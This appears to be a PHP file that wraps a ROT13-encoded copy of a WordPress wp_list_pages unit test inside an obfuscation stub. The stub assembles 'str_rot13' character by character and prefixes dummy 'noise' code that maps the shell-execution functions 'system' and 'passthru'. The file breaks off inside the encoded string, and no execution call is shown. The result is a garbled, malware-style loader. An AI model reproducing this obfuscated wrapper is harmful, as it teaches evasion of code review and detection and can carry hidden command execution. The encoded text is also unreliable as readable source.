<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_jcYvfgCntrf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Rqvgbe hfre VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $rqvgbe;

	/**
	 * Nhgube hfre VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nhgube;

	/**
	 * Cnerag cntr VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cnerag_1;

	/**
	 * Cnerag cntr VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cnerag_2;

	/**
	 * Cnerag cntr VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $cnerag_3;

	/**
	 * Puvyq cntr VQf.
	 *
	 * @ine neenl
	 */
	choyvp fgngvp $puvyqera = neenl();

	/**
	 * Pheerag gvzrfgnzc pnpur, fb gung vg vf pbafvfgrag npebff cbfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $gvzr;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$gvzr = gvzr();

		$cbfg_qngr = tzqngr( 'L-z-q U:v:f', frys::$gvzr );

		frys::$rqvgbe = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		frys::$nhgube = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );

		frys::$cnerag_1 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$rqvgbe,
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Cnerag 1',
				'cbfg_qngr'   => $cbfg_qngr,
			)
		);

		frys::$cnerag_2 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cnerag 2',
				'cbfg_qngr'  => $cbfg_qngr,
			)
		);

		frys::$cnerag_3 = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube,
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Cnerag 3',
				'cbfg_qngr'   => $cbfg_qngr,
			)
		);

		sbernpu ( neenl( frys::$cnerag_1, frys::$cnerag_2, frys::$cnerag_3 ) nf $cntr ) {
			frys::$puvyqera[ $cntr ][] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_cnerag' => $cntr,
					'cbfg_glcr'   => 'cntr',
					'cbfg_gvgyr'  => 'Puvyq 1',
					'cbfg_qngr'   => $cbfg_qngr,
				)
			);
			frys::$puvyqera[ $cntr ][] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_cnerag' => $cntr,
					'cbfg_glcr'   => 'cntr',
					'cbfg_gvgyr'  => 'Puvyq 2',
					'cbfg_qngr'   => $cbfg_qngr,
				)
			);
			frys::$puvyqera[ $cntr ][] = $snpgbel->cbfg->perngr(
				neenl(
					'cbfg_cnerag' => $cntr,
					'cbfg_glcr'   => 'cntr',
					'cbfg_gvgyr'  => 'Puvyq 3',
					'cbfg_qngr'   => $cbfg_qngr,
				)
			);
		}
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_qrsnhyg() {
		$netf = neenl(
			'rpub' => snyfr,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_qrcgu() {
		$netf = neenl(
			'rpub'  => snyfr,
			'qrcgu' => 1,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	/**
	 * @gvpxrg 61749
	 */
	choyvp shapgvba grfg_jc_yvfg_cntrf_qrcgu_rdhnyf_mreb() {
		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
</hy></yv>';

		// Rkrphgr jc_yvfg_cntrf() jvgu n fgevat gb sbepr pnyyvat jc_cnefr_netf().
		bo_fgneg();
		jc_yvfg_cntrf( 'qrcgu=0' );
		$bhgchg = bo_trg_pyrna();

		// Vs qrcgu rdhnyf 0, nyy yriryf fubhyq or qvfcynlrq.
		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, $bhgchg );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_fubj_qngr() {
		$netf = neenl(
			'rpub'      => snyfr,
			'qrcgu'     => 1,
			'fubj_qngr' => gehr,
		);
		$qngr = tzqngr( trg_bcgvba( 'qngr_sbezng' ), frys::$gvzr );

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n> ' . $qngr . '</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n> ' . $qngr . '</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n> ' . $qngr . '</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_qngr_sbezng() {
		$netf = neenl(
			'rpub'        => snyfr,
			'fubj_qngr'   => gehr,
			'qngr_sbezng' => 'y, S w, L',
		);
		$qngr = tzqngr( $netf['qngr_sbezng'], frys::$gvzr );

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n> ' . $qngr . '
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n> ' . $qngr . '</yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n> ' . $qngr . '
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n> ' . $qngr . '</yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n> ' . $qngr . '
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2</n> ' . $qngr . '</yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3</n> ' . $qngr . '</yv>
</hy>
</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_puvyq_bs() {
		$netf = neenl(
			'rpub'     => snyfr,
			'puvyq_bs' => frys::$cnerag_2,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_rkpyhqr() {
		$netf = neenl(
			'rpub'    => snyfr,
			'rkpyhqr' => frys::$cnerag_2,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">Puvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">Puvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">Puvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">Puvyq 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">Puvyq 2</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">Puvyq 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_gvgyr_yv() {
		$netf = neenl(
			'rpub'     => snyfr,
			'qrcgu'    => 1,
			'gvgyr_yv' => 'CntrGvgyr',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">CntrGvgyr<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_rpub() {
		$netf = neenl(
			'rpub'  => gehr,
			'qrcgu' => 1,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
</hy></yv>';
		$rkcrpgrq = fge_ercynpr( \"\e\a\", \"\a\", $rkcrpgrq );
		$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq );
		jc_yvfg_cntrf( $netf );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_nhgubef() {
		$netf = neenl(
			'rpub'    => snyfr,
			'nhgubef' => frys::$nhgube,
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . '\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_ahzore() {
		$netf = neenl(
			'rpub'        => snyfr,
			'ahzore'      => 1,
			'fbeg_pbyhza' => 'VQ',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . '\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_fbeg_pbyhza() {
		$netf = neenl(
			'rpub'        => snyfr,
			'qrcgu'       => 1,
			'fbeg_pbyhza' => 'cbfg_nhgube',
			'fbeg_beqre'  => 'QRFP',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">Cnerag 3</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1</n></yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">Cnerag 2</n></yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_yvax_orsber() {
		$netf = neenl(
			'rpub'        => snyfr,
			'yvax_orsber' => 'ORSBER',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">ORSBERCnerag 1</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">ORSBERPuvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">ORSBERPuvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][2] ) . '\">ORSBERPuvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_2 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_2 ) . '\">ORSBERCnerag 2</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][0] ) . '\">ORSBERPuvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][1] ) . '\">ORSBERPuvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_2 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_2 ][2] ) . '\">ORSBERPuvyq 3</n></yv>
</hy>
</yv>
<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_3 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_3 ) . '\">ORSBERCnerag 3</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][0] ) . '\">ORSBERPuvyq 1</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][1] ) . '\">ORSBERPuvyq 2</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_3 ][2] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_3 ][2] ) . '\">ORSBERPuvyq 3</n></yv>
</hy>
</yv>
</hy></yv>';

		$guvf->nffregFnzrVtaberRBY( $rkcrpgrq, jc_yvfg_cntrf( $netf ) );
	}

	choyvp shapgvba grfg_jc_yvfg_cntrf_yvax_nsgre() {
		$netf = neenl(
			'rpub'       => snyfr,
			'yvax_nsgre' => 'NSGRE',
		);

		$rkcrpgrq = '<yv pynff=\"cntrani\">Cntrf<hy><yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$cnerag_1 . ' cntr_vgrz_unf_puvyqera\"><n uers=\"' . trg_creznyvax( frys::$cnerag_1 ) . '\">Cnerag 1NSGRE</n>
<hy pynff=\'puvyqera\'>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][0] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][0] ) . '\">Puvyq 1NSGRE</n></yv>
	<yv pynff=\"cntr_vgrz cntr-vgrz-' . frys::$puvyqera[ frys::$cnerag_1 ][1] . '\"><n uers=\"' . trg_creznyvax( frys::$puvyqera[ frys::$cnerag_1 ][1] ) . '\">Puvyq 2NSGRE</n></yv>
